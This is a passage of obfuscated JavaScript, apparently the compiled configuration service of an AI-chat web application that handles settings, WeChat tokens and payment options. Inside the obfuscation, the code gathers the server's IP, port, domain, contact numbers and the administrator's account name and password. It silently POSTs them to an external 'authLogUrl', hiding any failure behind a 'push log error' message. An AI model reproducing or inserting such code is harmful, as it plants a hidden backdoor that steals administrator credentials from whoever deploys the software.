this['getConfigs']([_0x46845a(0x1ba),_0x46845a(0x217),_0x46845a(0x211),'domain',_0x46845a(0x232)]),_0x269bc3={'ip':_0x29382f,'key':_0x424e18,'port':_0x1e123e,'qqNumber':_0x509074,'vxNumber':_0x21f0a0,'domain':_0x3cbfb4,'adminAccount':_0x23a6ee,'adminPass':_0x118e04,'baseUrl':_0x3ac5ab,'siteName':_0x542772,'qq':_0x509074,'vxNum':_0x21f0a0,'version':AppConfig_1[_0x46845a(0x165)]},_0x359736={'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON['stringify'](_0x269bc3)};await fetch(authLogUrl,_0x359736)['catch'](_0x3b0908=>{const _0x3f1fdd=_0x46845a;console[_0x3f1fdd(0x1a7)](_0x3f1fdd(0x197),_0x3b0908);});}async[_0x11d762(0x1d6)](_0x2a4b1e){const _0x32cbe6=_0x11d762;return this[_0x32cbe6(0x1e0)]['findOne']({'where':{'configKey':_0x2a4b1e}});}async[_0x11d762(0x22d)](){const _0x4e7293=_0x11d762,_0xbd60b4=await this['configEntity'][_0x4e7293(0x1f1)]({'where':{'configKey':_0x4e7293(0x219)}});if(!_0xbd60b4||!_0xbd60b4[_0x4e7293(0x1ab)])throw new common_1[(_0x4e7293(0x20f))](_0x4e7293(0x1f5),common_1[_0x4e7293(0x19a)][_0x4e7293(0x1b6)]);const _0x1d8121=await axios_1[_0x4e7293(0x15b)][_0x4e7293(0x229)](_0xbd60b4[_0x4e7293(0x1ab)],{'responseType':_0x4e7293(0x236)}),_0x4c1bd2=Buffer[_0x4e7293(0x216)](_0x1d8121['data'])[_0x4e7293(0x21a)](_0x4e7293(0x173));return _0x4e7293(0x231)+_0x4c1bd2;}};GlobalConfigService=__decorate([(0x0,common_1[_0x11d762(0x226)])(),__param(0x0,(0x0,typeorm_1[_0x11d762(0x179)])(config_entity_1['ConfigEntity'])),__param(0x1,(0x0,typeorm_1[_0x11d762(0x179)])(chatLog_entity_1[_0x11d762(0x1b9)])),__metadata(_0x11d762(0x222),[typeorm_2[_0x11d762(0x18d)],typeorm_2['Repository'],models_service_1[_0x11d762(0x22e)]])],GlobalConfigService),exports[_0x11d762(0x1f9)]=GlobalConfigService;function _0x4002(){const _0x535edb=['configs','9kxwFUQptTaelrKStrwZQQ==','salesSeniorRatio','非超级管理员无权操作！','payEpayApiPayUrl','delete','__decorate','签到功能暂未开放!','wechatOfficialAppSecret','log','__esModule','nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5','payMpayChannel','configVal','操作完成！','checkDomain','length','salesBaseRatio','registerSendDrawMjCount','decrypt','split','Like','signInModel3Count','baiduCode','BAD_GATEWAY','global','inviteSendStatus','ChatLogEntity','qqNumber','6FCbSwr','getCopyright','还未配置微信的appId和secret、配置后才可进行微信扫码登录！！！','MoreThan','jsonwebtoken','some','reduce','payEpayChannel','&client_secret=','bpgLCZ+EOWPxxfPq8W/uxA==','ticket','MjdrawCount','OfficialService','./../chatLog/chatLog.entity','metadata','fetchBaseAccessToken','LY2oE7tW+26CpDCUVao9QQ==','typeorm','getWechatAccessToken','&grant_type=client_credentials','phoneRegisterStatus','payWechatStatus','hideString','goMaxAiAuth','@nestjs/common','appMenuHeaderTips','https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=','getConfigByKey','修改一项:\x20','noticeInfo','payWeChatPublicKey','firstRregisterSendModel4Count','lockchatlog','filingNumber','Logger','fetchJsapiTicket','gpt','configEntity','map','modelsService','baiduTextSecretKey','theme','设置配置信息错误！','chatLogEntity','NAMESPACE','nineai','error','wechatSilentLoginStatus','baiduTextStatus','getConfigs','wechatJsapiTicket','608300dtbbvN','createOrUpdate','refresh','findOne','设置完成！','isUseWxLogin','object','未配置\x20robotAvatar.','data','wechat','UNAUTHORIZED','GlobalConfigService','signInMjDrawToken','支付功能暂未开放!','code','获取微信access_token失败、错误信息：','clientFavoIconPath','1343241EBVEYh','init\x20service\x20finish','firstRregisterSendDrawMjCount','./config.entity','payEpayStatus','save','emailRegisterStatus','&secret=','headers','getAuthInfo','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0ZDV7rlji6LO/S+cD95Ru8Q','queryConfig','aliPhoneAccessKeySecret','../../config/MjConfig','getPhoneVerifyConfig','signInModel4Count','HttpException','4753384NbkCmw','siteName','995382zvQqWY','aliPhoneTemplateCode','getSensitiveConfig','json','from','vxNumber','pushLog','robotAvatar','toString','initBaiduSensitive','POST','exit','salesAllowDrawMoney','update','s4C7QVE7wVqqXCy0zhgwIA==','45172gnMHrq','design:paramtypes','companyName','then','63foFCbt','Injectable','百度敏感词配置检测失败，您的参数可能配置的不正确!','Status','get','role','user','signInStatus','robotAvatar2Base64','ModelsService','baiduTextAccessToken','chatGptKey','data:image/jpeg;base64,','registerBaseUrl','onModuleInit','getDiffArray','icpNumber','arraybuffer','getSignatureGiftConfig','inviteGiveSendDrawMjCount','../../config/WechatConfig','policeFilingNumber','includes','setConfig','lockmysql','initGetAllConfig','cos','buyCramiAddress','550nfBAbY','mjProxy','JPFq8fAlQE2V2Eq7KWYSxg==','setGptKeys','ISDEV','invitedGuestSendModel3Count','nineaiBuiltInSensitiveAuthKey','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0bno5L8H6T5QXXNUvLB6d1U','filter','every','default','wechatAccessToken','queryNotice','../../common/utils','__param','noticeTitle','appMenuHeaderBgUrl','../../config/AppConfig','settings','GOMAXAI_HOST','APP_VERSION','pay','application/json','GOMAXAI','251638IAOqDM','aliPhoneAccessKeyId','gomaxAiToken','请配置正确的秘钥、当前秘钥检测不通过！','当前非超级管理员无权操作！','https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=','payMpayStatus','111252sGNpUH','kaifa.qumao518.vip','notice','base64','env','clientLogoPath','domain','TRUE','baiduTextApiKey','InjectRepository','40EOIRzN','axios','policeFilingUrl','find','forEach','getAllKey','mindDefaultData','70KBBilB','bkYMP1mVCBurarEsc48hu4lD0nfoPfj1FccGPRuygRtgPnbJWkkvJGU6zhr/otMF6E7iBQk6kY90kyEI47sVTA==','ali','Key','@nestjs/typeorm','registerSendModel3Count','access_token','clientHomePath','error_description','configKey','epay','JWT_SECRET','Repository','defineProperty','openaiBaseUrl','nineaiBuiltInSensitiveStatus','entries','payHupiStatus','ceshi.qumao518.vip','wechatOfficialAppId','inviteGiveSendModel3Count','BAD_REQUEST','push\x20log\x20error','decorate','queryGptKeys','HttpStatus','function','globalConfigs','__metadata'];_0x4002=function(){return _0x535edb;};return _0x4002();}